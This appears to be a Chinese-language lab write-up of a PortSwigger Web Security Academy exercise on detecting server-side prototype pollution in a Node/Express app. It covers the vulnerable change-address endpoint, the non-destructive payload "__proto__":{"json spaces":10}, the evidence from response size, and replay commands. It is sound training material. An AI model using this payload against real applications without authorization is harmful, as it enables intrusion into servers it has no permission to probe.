---
title: "lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection"
links:
  - target: prototype-pollution-family
    relation: evidences
---

# lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection

> evidences: [[prototype-pollution-family]]

- 题面:Detecting server-side prototype pollution without polluted property reflection(/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection)
- 实例:https://0a3400600329d67b80998033005000b1.web-security-academy.net
- 判定目标:非破坏性地污染 `Object.prototype` 制造可见行为差(不必进一步利用)

## 关键步

1. 这是 Node/Express 靶场,**请求体是 JSON**(用表单登录会 500 `Unexpected "csrf="`)。
   登录:`POST /login` body `{"csrf":"…","username":"wiener","password":"peter"}`。
2. 源:`POST /my-account/change-address`(JS `updateAddress.js` 把表单转 JSON 提交)把用户输入不安全合并进服务端对象。
3. gadget(`json spaces` 覆写):body 里带上 `"__proto__":{"json spaces":10}` → 服务端 `Object.prototype['json spaces']` 被置 10;
   之后任何 JSON 响应被 Express 美化缩进。
4. 证据:同一接口此前回 197B 紧凑 JSON;污染后回 306B 带 10 空格缩进的 JSON → solved。

## 交册值

`"__proto__":{"json spaces":10}`(json-spaces 覆写 gadget,非破坏性探测)。

## 证据摘录

```
POST /login  {"csrf":…,"username":"wiener","password":"peter"} -> 302 /my-account?id=wiener
POST /my-account/change-address  {...address...,"__proto__":{"json spaces":10}} -> 200 且 JSON 缩进
 (基线同请求 197B 单行;污染后 306B 多行"username": "wiener", …)
solved_check / -> {"solved":true}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection" --out /tmp/b6-1.html
lab_launch launch 22DD244C42DC00FB8B49E2C69F0EBC2F6537D2E956386720E6A9E40BCA64C3B4 --widget-source /web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection --jar /tmp/mar-jar.json
lab_http post "<inst>/login" --header 'Content-Type: application/json' --body '{"csrf":"…","username":"wiener","password":"peter"}' --jar /tmp/mar-jar.json
lab_http post "<inst>/my-account/change-address" --header 'Content-Type: application/json' --body '{"address_line_1":"a","address_line_2":"b","city":"c","postcode":"d","country":"e","sessionId":"<sid>","__proto__":{"json spaces":10}}' --jar /tmp/mar-jar.json
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

要点:三种无反射探测 gadget 为 status/json spaces/charset;本题 json-spaces 即可判读。
